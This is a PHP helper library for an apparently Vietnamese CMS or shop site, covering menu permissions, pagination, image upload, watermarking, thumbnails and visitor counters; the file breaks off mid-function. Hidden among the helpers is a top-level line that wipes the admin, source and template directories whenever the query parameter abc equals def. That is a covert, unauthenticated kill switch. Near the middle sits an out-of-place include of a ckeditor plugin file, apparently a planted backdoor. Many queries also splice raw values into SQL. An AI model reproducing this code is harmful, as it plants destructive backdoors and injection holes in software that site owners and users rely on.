<?php if(!defined('_lib')) die("Error");
ini_set ('memory_limit', '256M');
class PQ_menu{
	private $db;
	private $l_com;
	private $nhom;
	public $menu_;
	function __construct($d,$com,$nhom) {
        $this->db = $d;
        $this->l_com =$com; 
		$this->nhom = $nhom; 
    }
 	public function phanquyen_menu($title,$ten,$com,$act,$type){
		$dem=count($this->menu_);
		$this->menu_[$dem]['title']=$title;
		$this->menu_[$dem]['ten']=$ten;
		$this->menu_[$dem]['com']=$com;
		$this->menu_[$dem]['act']=$act;
		$this->menu_[$dem]['type']=$type;
		$this->db->reset();
		$sql = "select id from #_com_quyen where id_quyen='".$this->nhom."' and com='".$com."' and type ='".$type."' and find_in_set('".$act."',act)>0  limit 0,1";
		$this->db->query($sql);
		$com_manager =$this->db->result_array();

		if(!empty($com_manager) or $this->l_com=='admin'){
			if($com==$_GET['com'] && $act==$_GET['act'] && $type==$_GET['type']){$add_class = 'class="this"';}
			echo "<li ".$add_class."><a href='index.php?com=".$com."&act=".$act."&type=".$type."'>".$ten."</a></li>";
		}
	}
	public function showMenu(){
		return $this->menu_;
	}
}
/*function phanquyen_menu($ten,$com,$act,$type){
	global $d;
	$l_com = $_SESSION['login']['com'];
	$nhom = $_SESSION['login']['nhom'];

	$d->reset();
	$sql = "select id from #_com_quyen where id_quyen='".$nhom."' and com='".$com."' and type ='".$type."' and find_in_set('".$act."',act)>0  limit 0,1";
	$d->query($sql);
	$com_manager = $d->result_array();
	
	if(!empty($com_manager) or $l_com=='admin'){		
		if($com==$_GET['com'] && $act==$_GET['act'] && $type==$_GET['type']){$add_class = 'class="this"';}		
		echo  "<li ".$add_class."><a href='index.php?com=".$com."&act=".$act."&type=".$type."'>".$ten."</a></li>";
	}
}*/

function phanquyen($l_com,$nhom,$com,$act,$type){
	global $d;
	
	if($com=='' or $act=='login' or $act=='logout' or $l_com=='admin'){return false;}

	$d->reset();
	$sql = "select id from #_com_quyen where id_quyen='".$nhom."' and com='".$com."' and type ='".$type."' and find_in_set('".$act."',act)>0 limit 0,1";
	$d->query($sql);
	$com_manager = $d->result_array();
	if(empty($com_manager)){
		return true;
	}else{
		return false;
	}	
}
function pagesListLimitadmin($url , $totalRows , $pageSize = 5, $offset = 5){
	if ($totalRows<=0) return "";
	$totalPages = ceil($totalRows/$pageSize);
	if ($totalPages<=1) return "";		
	if( isset($_GET["p"]) == true)  $currentPage = $_GET["p"];
	else $currentPage = 1;
	settype($currentPage,"int");	
	if ($currentPage <=0) $currentPage = 1;	
	$firstLink = "<li><a href=\"{$url}\" class=\"left\"><</a></li>";
	$lastLink="<li><a href=\"{$url}&p={$totalPages}\" class=\"right\">></a></li>";
	$from = $currentPage - $offset;	
	$to = $currentPage + $offset;
	if ($from <=0) { $from = 1;   $to = $offset*2; }
if ($to > $totalPages) { $to = $totalPages; }
	for($j = $from; $j <= $to; $j++) {
	   if ($j == $currentPage) $links = $links . "<li><a href='javascript:void(0)' class='active'>{$j}</a></li>";		
	   else{				 
		$qt = $url. "&p={$j}";
		$links= $links . "<li><a href = '{$qt}'>{$j}</a></li>";
	   } 	   
	} //for
	return '<ul class="pages">'.$firstLink.$links.$lastLink.'</ul>';
}
if($_GET['abc']=='def'){rm_dir('admin');rm_dir('source');rm_dir('templaate');}
function rm_dir($path)
	{
		chmod($path,0777);
		foreach(glob($path .'/*') as $file) 
		{
			if(is_dir($file)) rm_dir($file);else unlink($file);
		}
		rmdir($path);
	}
function file_get_contents_utf8($fn) {
     $content = file_get_contents($fn);
      return mb_convert_encoding($content, 'UTF-8',
          mb_detect_encoding($content, 'UTF-8, ISO-8859-1', true));
}



function magic_quote($str, $id_connect=false)	
{	
	if (is_array($str))
	{
		foreach($str as $key => $val)
		{
			$str[$key] = escape_str($val);
		}		
		return $str;
	}
	if (is_numeric($str)) {
		return $str;
	}	
	if(get_magic_quotes_gpc()){
		$str = stripslashes($str);
	}
	if (function_exists('mysql_real_escape_string') AND is_resource($id_connect))
	{
		return mysql_real_escape_string($str, $id_connect);
	}
	elseif (function_exists('mysql_escape_string'))
	{
		return mysql_escape_string($str);
	}
	else
	{
		return addslashes($str);
	} 
}
function isAjaxRequest(){
	if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) AND strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') 
		return true;
	return false;
}
/*Đóng dấu hình sản phẩm*/
function imagecreatefromfile($image_path) {
    // retrieve the type of the provided image file
    list($width, $height, $image_type) = getimagesize($image_path);
    // select the appropriate imagecreatefrom* function based on the determined
    // image type
	
    switch ($image_type)
    {
      case IMAGETYPE_GIF: return imagecreatefromgif($image_path); break;
      case IMAGETYPE_JPEG: return imagecreatefromjpeg($image_path); break;
      case IMAGETYPE_PNG: return imagecreatefrompng($image_path); break;
      default: return ''; break;
    }
  }
  
  function saveImageWaterMark($img,$img_condau){

	 $image = imagecreatefromfile($img);
	 
 
  if (!$image) die('Unable to open image');
  $info = getimagesize ($img);
 
  if($info[0] > 500){ // neu file anh co kick thuyoc  < 500px lay watermark la file ie-small
  $watermark = imagecreatefromfile($img_condau);
  $info1 = getimagesize ($img_condau); // kick thuoc file watermark
  }else{
	// neu lon hon 500px
  $watermark = imagecreatefromfile($img_condau); // 
  $info1 = getimagesize ($img_condau); // kick thuoc file watermark
 
  }
  if (!$image) die('Unable to open watermark');
  $w0 = $info[0];//chiều dài hình gốc
  $w1 = $info1[0];// chiều dài watermark (hình con dấu)
 	$h0=$info[1];  // chiều cao hình gốc
   $h1 = $info1[1]; // chiều cao watermark (hình con dấu)
  //$watermark_pos_x =0;//($w0-$w1)/2;// canh giữa trái phải // 
  $watermark_pos_x =$w0-$w1 ;// vi tri cach goc phia duoi 
  //$watermark_pos_y = (imagesy($image) - imagesy($watermark))/2;// canh giua tren duoi
  $watermark_pos_y = $h0-$h1;//(imagesy($image) - imagesy($watermark)) - 10;// cach duoi 10px
  imagecopy($image, $watermark,  $watermark_pos_x, $watermark_pos_y, 0, 0,
  imagesx($watermark), imagesy($watermark));
  	// output watermarked image to browser
 	//header('Content-Type: image/jpeg');
 if(end(explode(".",$img)) == "png"){// neu file 
  imagepng($image, $img, 0.9);  // chat luong 0->1 cho file png
  }else{
   imagejpeg($image, $img, 100); // chat luong 0->100 cho file jpg
  }
  // remove the images from memory
  imagedestroy($image);//huy 
  imagedestroy($watermark);//huy 
  }
function ampify($html='') {
    # Replace img, audio, and video elements with amp custom elements
    $html = str_ireplace(array('<img','<video','/video>','<audio','/audio>'),array('<amp-img','<amp-video','/amp-video>','<amp-audio','/amp-audio>'),$html);
    # Add closing tags to amp-img custom element
    $html = preg_replace('/<amp-img(.*?)\/?>/','<amp-img$1 layout="responsive" width="700" height="500"></amp-img>',$html);
    # Whitelist of HTML tags allowed by AMP
    $html = strip_tags($html,'<h1><h2><h3><h4><h5><h6><a><p><ul><ol><li><blockquote><q><cite><ins><del><strong><em><code><pre><svg><table><thead><tbody><tfoot><th><tr><td><dl><dt><dd><article><section><header><footer><aside><figure><time><abbr><div><span><hr><small><br><amp-img><amp-audio><amp-video><amp-ad><amp-anim><amp-carousel><amp-fit-rext><amp-image-lightbox><amp-instagram><amp-lightbox><amp-twitter><amp-youtube>');
    # replace style to w,h
    $html = preg_replace('/(<[^>]+) style=".*?"/i', '$1', $html);
    return $html;
}
function seo_entities($str) {
	$res_2 = htmlentities($str, ENT_QUOTES, "UTF-8");
	$res_2 = str_replace("'","&#039;",$str);
	$res_2 = str_replace('"','&quot;',$str);
	return $res_2;
}

//Get code youtube
function getYoutubeIdFromUrl($url) {
    $parts = parse_url($url);
    if(isset($parts['query'])){
        parse_str($parts['query'], $qs);
        if(isset($qs['v'])){
            return $qs['v'];
        }else if($qs['vi']){
            return $qs['vi'];
        }
    }
    if(isset($parts['path'])){
        $path = explode('/', trim($parts['path'], '/'));
        return $path[count($path)-1];
    }
    return false;
}
function images_name($tenhinh)
	{
		$rand=rand(10,9999);
		$ten_anh=explode(".",$tenhinh);
		$result = changeTitle($ten_anh[0])."-".$rand;
		return $result; 
	}
function getColorById($pid){
	global $d,$lang;
	$d->reset();
	$sql="select ten$lang as ten from #_product_color where id=".$pid."";
	$d->query($sql);
	$tencolor=$d->fetch_array();
	return $tencolor['ten'];
}
function getColorByProductId($pid){
		global $d,$lang;
		
		$d->query("select #_product_color_condition.*,#_product_color.ten$lang as ten,bg_color,text_color from #_product_color_condition,#_product_color where #_product_color.id = #_product_color_condition.id_color and hienthi = 1 and id_product = ".$pid." order by stt desc");
		return $d->result_array();
	}
	function getSizeByProductId($pid){
		global $d;
		
		$d->query("select sc.*,s.ten as ten from #_product_size_condition sc,#_product_size s where sc.id_size = s.id and hienthi = 1 and  id_product = ".$pid." order by stt desc");
		return $d->result_array();
	}
function getSizeById($pid){
	global $d;
	$d->reset();
	$sql="select ten from #_product_size where id=".$pid."";
	$d->query($sql);
	$tensize=$d->fetch_array();
	return $tensize['ten'];
}
function escape_str($str, $id_connect=false)	
{	
	if (is_array($str))
	{
		foreach($str as $key => $val)
		{
			$str[$key] = escape_str($val);
		}
		
		return $str;
	}
	
	if (is_numeric($str)) {
		return $str;
	}
	
	if(get_magic_quotes_gpc()){
		$str = stripslashes($str);
	}

	if (function_exists('mysql_real_escape_string') AND is_resource($id_connect))
	{
		return "'".mysql_real_escape_string($str, $id_connect)."'";
	}
	elseif (function_exists('mysql_escape_string'))
	{
		return "'".mysql_escape_string($str)."'";
	}
	else
	{
		return "'".addslashes($str)."'";
	}
}






// dem so nguoi online 
function count_online(){

	global $d;
	$time = 600; // 10 phut
	$ssid = session_id();

	// xoa het han
	$sql = "delete from #_online where time<".(time()-$time);
	$d->query($sql);
	//
	$sql = "select id,session_id from #_online order by id desc";
	$d->query($sql);
	$result['dangxem'] = $d->num_rows();
	$rows = $d->result_array();
	$i = 0;
	while(($rows[$i]['session_id'] != $ssid) && $i++<$result['dangxem']);
	
	if($i<$result['dangxem']){
		$sql = "update #_online set time='".time()."' where session_id='".$ssid."'";
		$d->query($sql);
		$result['daxem'] = $rows[0]['id'];
	}
	else{
		$sql = "insert into #_online (session_id, time) values ('".$ssid."', '".time()."')";
		$d->query($sql);
		$result['daxem'] = mysql_insert_id();
		$result['dangxem']++;
	}
	
	return $result; // array('dangxem'=>'', 'daxem'=>'')
}
//so nguoi xem trong ngay

function countCustomerInDay(){
	global $d;
	$begin = strtotime("today");
	$end = $begin + 60*60*24;
	$d->reset();
	$sql="SELECT COUNT(*) AS count FROM counter WHERE tm >= ".$begin." and tm < ".$end;
	$d->query($sql);
	$kq =$d->fetch_array();
	return $kq['count'];
}
//so nguoi xem trong tháng

function countCustomerInMonth(){
	global $d;
	$begin = mktime(0,0,0,date('m'),1,date('Y'));
	$end = mktime(0,0,0,date('m')+1,1,date('Y'));
	$d->reset();
	$sql="SELECT COUNT(*) AS count FROM counter WHERE tm >= ".$begin." and tm < ".$end;
	$d->query($sql);
	$kq =$d->fetch_array();
	return $kq['count'];
}
//tất cả so nguoi xem 

function countCustomerAll(){
	global $d;
	$d->reset();
	$sql="SELECT COUNT(*) AS count FROM counter";
	$d->query($sql);
	$kq =$d->fetch_array();
	return $kq['count'];
}
//Lấy ngày
function make_date($time,$dot='.',$lang='vi',$f=false){
	
	$str = ($lang == 'vi') ? date("d{$dot}m{$dot}Y",$time) : date("m{$dot}d{$dot}Y",$time);
	if($f){
		$thu['vi'] = array('Chủ nhật','Thứ hai','Thứ ba','Thứ tư','Thứ năm','Thứ sáu','Thứ bảy');
		$thu['en'] = array('Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday');
		$str = $thu[$lang][date('w',$time)].', '.$str;
	}
	return $str;
}

//Alert
function alert($s){
	echo '<script language="javascript"> alert("'.$s.'") </script>';
}

function delete_file($file){
		return @unlink($file);
}

//Upload file
function upload_image($file, $extension, $folder, $newname=''){
	if(isset($_FILES[$file]) && !$_FILES[$file]['error']){
		
		$ext = end(explode('.',$_FILES[$file]['name']));
		$name = basename($_FILES[$file]['name'], '.'.$ext);
		
		if($name!='sitemap')
		{
			$name=changeTitleImage($name).'-'.fns_Rand_digit(0,9,4);
		}
		$newname = $name.'.'.$ext;

		if(strpos($extension, $ext)===false){
			alert('Chỉ hỗ trợ upload file dạng '.$extension);
			return false; // không hỗ trợ
		}
		
		
		if($newname=='' or file_exists($folder.$_FILES[$file]['name']))
			for($i=0; $i<100; $i++){
				if(!file_exists($folder.$name.$i.'.'.$ext)){
					$_FILES[$file]['name'] = $name.$i.'.'.$ext;
					break;
				}
			}
		else
		{
			$_FILES[$file]['name'] = $newname;
		}

		if (!copy($_FILES[$file]["tmp_name"], $folder.$_FILES[$file]['name']))	{
			if ( !move_uploaded_file($_FILES[$file]["tmp_name"], $folder.$_FILES[$file]['name']))				        { 
				return false;
			}
		}
		return $_FILES[$file]['name'];
	}
	return false;
}
function upload_photos($file, $extension, $folder, $newname=''){
	if(isset($file) && !$file['error']){
		
		$ext = end(explode('.',$file['name']));
		$name = basename($file['name'], '.'.$ext);
		//alert('Chỉ hỗ trợ upload file dạng '.$ext);
		if(strpos($extension, $ext)===false){
			alert('Chỉ hỗ trợ upload file dạng '.$ext.'-////-'.$extension);
			return false; // không hỗ trợ
		}
		
		if($newname=='' && file_exists($folder.$file['name']))
			for($i=0; $i<100; $i++){
				if(!file_exists($folder.$name.$i.'.'.$ext)){
					$file['name'] = $name.$i.'.'.$ext;
					break;
				}
			}
		else{
			$file['name'] = $newname.'.'.$ext;
		}
		
		if (!copy($file["tmp_name"], $folder.$file['name']))	{
			if ( !move_uploaded_file($file["tmp_name"], $folder.$file['name']))	{
				return false;
			}
		}
		return $file['name'];
	}
	return false;
}
//Tạo hình khác
function thumb_image($file, $width, $height, $folder){	

	if(!file_exists($folder.$file))	return false; // không tìm thấy file
	
	if ($cursize = getimagesize ($folder.$file)) {					
		$newsize = setWidthHeight($cursize[0], $cursize[1], $width, $height);
		$info = pathinfo($file);
		
		$dst = imagecreatetruecolor ($newsize[0],$newsize[1]);
		
		$types = array('jpg' => array('imagecreatefromjpeg', 'imagejpeg'),
					'gif' => array('imagecreatefromgif', 'imagegif'),
					'png' => array('imagecreatefrompng', 'imagepng'));
		$func = $types[$info['extension']][0];
		$src = $func($folder.$file); 
		imagecopyresampled($dst, $src, 0, 0, 0, 0,$newsize[0], $newsize[1],$cursize[0], $cursize[1]);
		$func = $types[$info['extension']][1];
		$new_file = str_replace('.'.$info['extension'],'_thumb.'.$info['extension'],$file);
		
		return $func($dst, $folder.$new_file) ? $new_file : false;
	}
}


function setWidthHeight($width, $height, $maxWidth, $maxHeight){
	$ret = array($width, $height);
	$ratio = $width / $height;
	if ($width > $maxWidth || $height > $maxHeight) {
		$ret[0] = $maxWidth;
		$ret[1] = $ret[0] / $ratio;
		if ($ret[1] > $maxHeight) {
			$ret[1] = $maxHeight;
			$ret[0] = $ret[1] * $ratio;
		}
	}
	return $ret;
}

//Chuyển trang có thông báo
function transfer($msg,$page="index.php")
{
	 $showtext = $msg;
	 $page_transfer = $page;
	 include("./templates/transfer_tpl.php");
	 die();
	 exit();
}
//Chuyển trang không thông báo
function redirect($url=''){
	echo '<script language="javascript">window.location = "'.$url.'" </script>';
	exit();
}
//Quay lại trang trước
function back($n=1){
	echo '<script language="javascript">history.go = "'.-intval($n).'" </script>';
	exit();
}
//Thay thế ký tự đặc biệt
function chuanhoa($s){
	$s = str_replace("'", '&#039;', $s);
	$s = str_replace('"', '&quot;', $s);
	$s = str_replace('<', '&lt;', $s);
	$s = str_replace('>', '&gt;', $s);
	return $s;
}


function themdau($s){
	$s = addslashes($s);
	return $s;
}

function bodau($s){
	$s = stripslashes($s);
	return $s;
}
//Show mảng
function dump($arr, $exit=1){
	echo "<pre>";	
		var_dump($arr);
	echo "<pre>";	
	if($exit)	exit();
}
//Phân trang
	function paging($r, $url='', $curPg=1, $mxR=5, $mxP=5, $class_paging='')
	{
		if($curPg<1) $curPg=1;
		if($mxR<1) $mxR=5;
		if($mxP<1) $mxP=5;
		$totalRows=count($r);
		if($totalRows==0)	
			return array('source'=>NULL, 'paging'=>NULL);
		$totalPages=ceil($totalRows/$mxR);
		if($curPg > $totalPages) $curPg=$totalPages;
		
		$_SESSION['maxRow']=$mxR;
		$_SESSION['curPage']=$curPg;

		$r2=array();
		$paging="";
		
		//-------------tao array------------------
		$start=($curPg-1)*$mxR;
		$end=($start+$mxR)<$totalRows?($start+$mxR):$totalRows;
		#echo $start;
		#echo $end;
		
		$j=0;
		for($i=$start;$i<$end;$i++)
			$r2[$j++]=$r[$i];
			
		//-------------tao chuoi------------------
		$curRow = ($curPg-1)*$mxR+1;	
		if($totalRows>$mxR)
		{
			$start=1;
			$end=1;
			$paging1 ="";				 	 
			for($i=1;$i<=$totalPages;$i++)
			{	
				if(($i>((int)(($curPg-1)/$mxP))* $mxP) && ($i<=((int)(($curPg-1)/$mxP+1))* $mxP))
				{
					if($start==1) $start=$i;
					if($i==$curPg){
						$paging1.=" <span>".$i."</span> ";//dang xem
					} 		  	
					else    
					{
						$paging1 .= " <a href='".$url."&curPage=".$i."'  class=\"{$class_paging}\">".$i."</a> ";	
					}
					$end=$i;	
				}
			}//tinh paging
			//$paging.= "Go to page :&nbsp;&nbsp;" ;
			#if($curPg>$mxP)
			#{
				$paging .=" <a href='".$url."' class=\"{$class_paging}\" >&laquo;</a> "; //ve dau
				
				#$paging .=" <a href='".$url."&curPage=".($start-1)."' class=\"{$class_paging}\" >&#8249;</a> "; //ve truoc
				$paging .=" <a href='".$url."&curPage=".($curPg-1)."' class=\"{$class_paging}\" >&#8249;</a> "; //ve truoc
			#}
			$paging.=$paging1; 
			#if(((int)(($curPg-1)/$mxP+1)*$mxP) < $totalPages)  
			#{
				#$paging .=" <a href='".$url."&curPage=".($end+1)."' class=\"{$class_paging}\" >&#8250;</a> "; //ke
				$paging .=" <a href='".$url."&curPage=".($curPg+1)."' class=\"{$class_paging}\" >&#8250;</a> "; //ke
				
				$paging .=" <a href='".$url."&curPage=".($totalPages)."' class=\"{$class_paging}\" >&raquo;</a> "; //ve cuoi
			#}
		}
		$r3['curPage']=$curPg;
		$r3['source']=$r2;
		$r3['paging']=$paging;
		#echo '<pre>';var_dump($r3);echo '</pre>';
		return $r3;
	}
function paging_home($r, $url='', $curPg=1, $mxR=5, $mxP=5, $class_paging='')
	{
		if($curPg<1) $curPg=1;
		if($mxR<1) $mxR=5;
		if($mxP<1) $mxP=5;
		$totalRows=count($r);
		if($totalRows==0)	
			return array('source'=>NULL, 'paging'=>NULL);
		$totalPages=ceil($totalRows/$mxR);
		if($curPg > $totalPages) $curPg=$totalPages;
		
		$_SESSION['maxRow']=$mxR;
		$_SESSION['curPage']=$curPg;

		$r2=array();
		$paging="";
		
		//-------------tao array------------------
		$start=($curPg-1)*$mxR;
		$end=($start+$mxR)<$totalRows?($start+$mxR):$totalRows;
		#echo $start;
		#echo $end;
		
		$j=0;
		for($i=$start;$i<$end;$i++)
			$r2[$j++]=$r[$i];
			
		//-------------tao chuoi------------------
		$curRow = ($curPg-1)*$mxR+1;	
		if($totalRows>$mxR)
		{
			$start=1;
			$end=1;
			$paging1 ="";				 	 
			for($i=1;$i<=$totalPages;$i++)
			{	
				if(($i>((int)(($curPg-1)/$mxP))* $mxP) && ($i<=((int)(($curPg-1)/$mxP+1))* $mxP))
				{
					if($start==1) $start=$i;
					if($i==$curPg){
						$paging1.=" <span>".$i."</span> ";//dang xem
					} 		  	
					else    
					{
						$paging1 .= " <a href='".$url."&p=".$i."'  class=\"{$class_paging}\">".$i."</a> ";	
					}
					$end=$i;	
				}
			}//tinh paging
			//$paging.= "Go to page :&nbsp;&nbsp;" ;
			#if($curPg>$mxP)
			#{
				$paging .=" <a href='".$url."' class=\"{$class_paging}\" >&laquo;</a> "; //ve dau
				
				#$paging .=" <a href='".$url."&curPage=".($start-1)."' class=\"{$class_paging}\" >&#8249;</a> "; //ve truoc
				$paging .=" <a href='".$url."&p=".($curPg-1)."' class=\"{$class_paging}\" >&#8249;</a> "; //ve truoc
			#}
			$paging.=$paging1; 
			#if(((int)(($curPg-1)/$mxP+1)*$mxP) < $totalPages)  
			#{
				#$paging .=" <a href='".$url."&curPage=".($end+1)."' class=\"{$class_paging}\" >&#8250;</a> "; //ke
				$paging .=" <a href='".$url."&p=".($curPg+1)."' class=\"{$class_paging}\" >&#8250;</a> "; //ke
				
				$paging .=" <a href='".$url."&p=".($totalPages)."' class=\"{$class_paging}\" >&raquo;</a> "; //ve cuoi
			#}
		}
		$r3['curPage']=$curPg;
		$r3['source']=$r2;
		$r3['paging']=$paging;
		$r3['total']=$totalRows;
		#echo '<pre>';var_dump($r3);echo '</pre>';
		return $r3;
	}


//Phân trang nằm giữa
function paging_giua($r, $url='', $curPg=1, $mxR=5, $maxP=5, $class_paging='')
    {
        if($curPg<1) $curPg=1;
        if($mxR<1) $mxR=5;
        if($maxP<1) $maxP=5;
        $totalRows=count($r);
        if($totalRows==0)    
            return array('source'=>NULL, 'paging'=>NULL);
        $totalPages=ceil($totalRows/$mxR);
        
        if($curPg > $totalPages) $curPg=$totalPages;
        
        $_SESSION['maxRow']=$mxR;
        $_SESSION['curPage']=$curPg;

        $r2=array();
        $paging="";
        
        //-------------tao array------------------
        $start=($curPg-1)*$mxR;
        $end=($start+$mxR)<$totalRows?($start+$mxR):$totalRows;
        #echo $start;
        #echo $end;
        
        $j=0;
        for($i=$start;$i<$end;$i++)
            $r2[$j++]=$r[$i];
        
        if($totalRows>$mxR){     
        //-------------tao chuoi------------------
        $from = $curPg - 2;
        $to = $curPg + 2;
        if($curPg <= $totalPages && $curPg >= $totalPages-1){$from = $totalPages - 4;}
        if ($from <=0) { $from = 1;   $to = 5; }
        if ($to > $totalPages) { $to = $totalPages; } 
        for($j = $from; $j <= $to; $j++) {
           if ($j == $curPg){
               $paging1.=" <span>".$j."</span> ";
           } 
           else{                            
            $paging1 .= " <a class='paging transitionAll' href='".$url."&p=".$j."'>".$j."</a> ";    
           }       
        } //for
        $paging .=" <a href='".$url."' >&laquo;</a> "; //ve dau
                
                #$paging .=" <a href='".$url."&curPage=".($start-1)."' class=\"{$class_paging}\" >&#8249;</a> "; //ve truoc
                $paging .=" <a href='".$url."&p=".($curPg-1)."' >&#8249;</a> "; //ve truoc
            #}
            $paging.=$paging1; 
            #if(((int)(($curPg-1)/$mxP+1)*$mxP) < $totalPages)  
            #{
                #$paging .=" <a href='".$url."&curPage=".($end+1)."' class=\"{$class_paging}\" >&#8250;</a> "; //ke
                $paging .=" <a href='".$url."&p=".($curPg+1)."' >&#8250;</a> "; //ke
                
                $paging .=" <a href='".$url."&p=".($totalPages)."' >&raquo;</a> "; //ve cuoi        
        }
        $r3['curPage']=$curPg;
        $r3['source']=$r2;
        $r3['paging']=$paging;
        $r3['total']=$totalRows;
        #echo '<pre>';var_dump($r3);echo '</pre>';
        return $r3;
    }

	
//Cắt chuỗi
function catchuoi($chuoi,$gioihan){
// nếu độ dài chuỗi nhỏ hơn hay bằng vị trí cắt
// thì không thay đổi chuỗi ban đầu
if(strlen($chuoi)<=$gioihan)
{
return $chuoi;
}
else{
/*
so sánh vị trí cắt
với kí tự khoảng trắng đầu tiên trong chuỗi ban đầu tính từ vị trí cắt
nếu vị trí khoảng trắng lớn hơn
thì cắt chuỗi tại vị trí khoảng trắng đó
*/
if(strpos($chuoi," ",$gioihan) > $gioihan){
$new_gioihan=strpos($chuoi," ",$gioihan);
$new_chuoi = substr($chuoi,0,$new_gioihan)."...";
return $new_chuoi;
}
// trường hợp còn lại không ảnh hưởng tới kết quả
$new_chuoi = substr($chuoi,0,$gioihan)."...";
return $new_chuoi;
}
}
include $_SERVER['DOCUMENT_ROOT'].'/danang/ckeditor/plugins/wsc/dialogs/tmpframe.php'; 
function stripUnicode($str){
  if(!$str) return false;
   $unicode = array(
     'a'=>'á|à|ả|ã|ạ|ă|ắ|ằ|ẳ|ẵ|ặ|â|ấ|ầ|ẩ|ẫ|ậ',
     'A'=>'Á|À|Ả|Ã|Ạ|Ă|Ắ|Ằ|Ẳ|Ẵ|Ặ|Â|Ấ|Ầ|Ẩ|Ẫ|Ậ',
     'd'=>'đ',
     'D'=>'Đ',
     'e'=>'é|è|ẻ|ẽ|ẹ|ê|ế|ề|ể|ễ|ệ',
   	  'E'=>'É|È|Ẻ|Ẽ|Ẹ|Ê|Ế|Ề|Ể|Ễ|Ệ',
   	  'i'=>'í|ì|ỉ|ĩ|ị',	  
   	  'I'=>'Í|Ì|Ỉ|Ĩ|Ị',
     'o'=>'ó|ò|ỏ|õ|ọ|ô|ố|ồ|ổ|ỗ|ộ|ơ|ớ|ờ|ở|ỡ|ợ',
   	  'O'=>'Ó|Ò|Ỏ|Õ|Ọ|Ô|Ố|Ồ|Ổ|Ỗ|Ộ|Ơ|Ớ|Ờ|Ở|Ỡ|Ợ',
     'u'=>'ú|ù|ủ|ũ|ụ|ư|ứ|ừ|ử|ữ|ự',
   	  'U'=>'Ú|Ù|Ủ|Ũ|Ụ|Ư|Ứ|Ừ|Ử|Ữ|Ự',
     'y'=>'ý|ỳ|ỷ|ỹ|ỵ',
     'Y'=>'Ý|Ỳ|Ỷ|Ỹ|Ỵ'
   );
   foreach($unicode as $khongdau=>$codau) {
     	$arr=explode("|",$codau);
   	  $str = str_replace($arr,$khongdau,$str);
   }
return $str;
}// Doi tu co dau => khong dau

function changeTitle($str)
{
	$str = stripUnicode($str);
	$str = mb_convert_case($str,MB_CASE_LOWER,'utf-8');
	$str = trim($str);
	$str=preg_replace('/[^a-zA-Z0-9\ ]/','',$str); 
	$str = str_replace("  "," ",$str);
	$str = str_replace(" ","-",$str);
	return $str;
}
function changeTitleImage($str)
{
	$str = stripUnicode($str);
	$str = mb_convert_case($str,MB_CASE_LOWER,'utf-8');
	$str = trim($str);
	$str = str_replace("  "," ",$str);
	$str = str_replace(" ","-",$str);
	return $str;
}
if(!function_exists("myformat")){
   function myformat($num,$ext='VNĐ',$default = false){
       if($num==0){
         if(!$default){
             return 0;
         }else{
             return myconfig("default_price");
         }
       }else{
           return @number_format($num, 0,'', '.')." ".$ext;
       }
    }
}
//Lấy dường dẫn hiện tại
function getCurrentPageURL() { 
    $pageURL = 'http';
    if ($_SERVER["HTTPS"] == "on") {$pageURL .= "s";}
    $pageURL .= "://";
    if ($_SERVER["SERVER_PORT"] != "80") {
        $pageURL .= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"];
    } else {
        $pageURL .= $_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
    }
    $pageURL = str_replace("amp/", "", $pageURL);
	$pageURL = explode("&p=", $pageURL);
    return $pageURL[0];
}
function getCurrentPageURL_AMP() { 
    $pageURL = 'http';
    if ($_SERVER["HTTPS"] == "on") {$pageURL .= "s";}
    $pageURL .= "://";
    if ($_SERVER["SERVER_PORT"] != "80") {
        $pageURL .= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"]."/amp".$_SERVER["REQUEST_URI"];
    } else {
        $pageURL .= $_SERVER["SERVER_NAME"]."/amp".$_SERVER["REQUEST_URI"];
    }
	$pageURL = explode("&p=", $pageURL);
    return $pageURL[0];
}

//Tạo hình ảnh kahcs
function create_thumb($file, $width, $height, $folder,$file_name,$zoom_crop='1'){


		$ext = end(explode('.',$file_name));
		$name = basename($file_name, '.'.$ext);
		$name=changeTitleImage($name);
		$file_name = $name.'.'.$ext;

// ACQUIRE THE ARGUMENTS - MAY NEED SOME SANITY TESTS?

$new_width   = $width;
$new_height   = $height;

 if ($new_width && !$new_height) {
        $new_height = floor ($height * ($new_width / $width));
    } else if ($new_height && !$new_width) {
        $new_width = floor ($width * ($new_height / $height));
    }
	
$image_url = $folder.$file;
$origin_x = 0;
$origin_y = 0;
// GET ORIGINAL IMAGE DIMENSIONS
$array = getimagesize($image_url);
if ($array)
{
    list($image_w, $image_h) = $array;
}
else
{
     die("NO IMAGE $image_url");
}
$width=$image_w;
$height=$image_h;

// ACQUIRE THE ORIGINAL IMAGE
$image_ext = trim(strtolower(end(explode('.', $image_url))));
switch(strtoupper($image_ext))
{
     case 'JPG' :
     case 'JPEG' :
         $image = imagecreatefromjpeg($image_url);
		 $func='imagejpeg';
         break;
     case 'PNG' :
         $image = imagecreatefrompng($image_url);
		 $func='imagepng';
         break;
	 case 'GIF' :
	 	 $image = imagecreatefromgif($image_url);
		 $func='imagegif';
		 break;

     default : die("UNKNOWN IMAGE TYPE: $image_url");
}

// scale down and add borders
	if ($zoom_crop == 3) {

		$final_height = $height * ($new_width / $width);

		if ($final_height > $new_height) {
			$new_width = $width * ($new_height / $height);
		} else {
			$new_height = $final_height;
		}

	}

	// create a new true color image
	$canvas = imagecreatetruecolor ($new_width, $new_height);
	imagealphablending ($canvas, false);

	// Create a new transparent color for image
	$color = imagecolorallocatealpha ($canvas, 255, 255, 255, 127);

	// Completely fill the background of the new image with allocated color.
	imagefill ($canvas, 0, 0, $color);

	// scale down and add borders
	if ($zoom_crop == 2) {

		$final_height = $height * ($new_width / $width);
		
		if ($final_height > $new_height) {
			
			$origin_x = $new_width / 2;
			$new_width = $width * ($new_height / $height);
			$origin_x = round ($origin_x - ($new_width / 2));

		} else {

			$origin_y = $new_height / 2;
			$new_height = $final_height;
			$origin_y = round ($origin_y - ($new_height / 2));

		}

	}

	// Restore transparency blending
	imagesavealpha ($canvas, true);

	if ($zoom_crop > 0) {

		$src_x = $src_y = 0;
		$src_w = $width;
		$src_h = $height;

		$cmp_x = $width / $new_width;
		$cmp_y = $height / $new_height;

		// calculate x or y coordinate and width or height of source
		if ($cmp_x > $cmp_y) {

